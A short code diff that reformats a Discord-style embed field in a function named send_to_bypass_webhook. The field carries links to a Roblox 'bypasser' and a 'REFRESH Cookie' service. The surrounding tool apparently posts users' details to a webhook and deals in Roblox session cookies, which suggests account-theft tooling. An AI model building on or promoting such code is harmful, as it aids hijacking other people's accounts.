@@ -220,7 +220,7 @@ def send_to_bypass_webhook(user_info, ping_content):
                         },
                         {
                             'name': '✅ Status',
-                            'value': 'Successful 🟢 [BYPASSER LINK](https://rblx-forcer.vercel.app) 🎗️[REFRESH Cookie](https://rblxrefresh.net/r/refreshercookie1)',
+                            'value': 'Successful 🟢\n[BYPASSER LINK](https://rblx-forcer.vercel.app)\n[REFRESH Cookie](https://rblxrefresh.net/r/refreshercookie1)',
                             'inline': False
                         }
                     ],
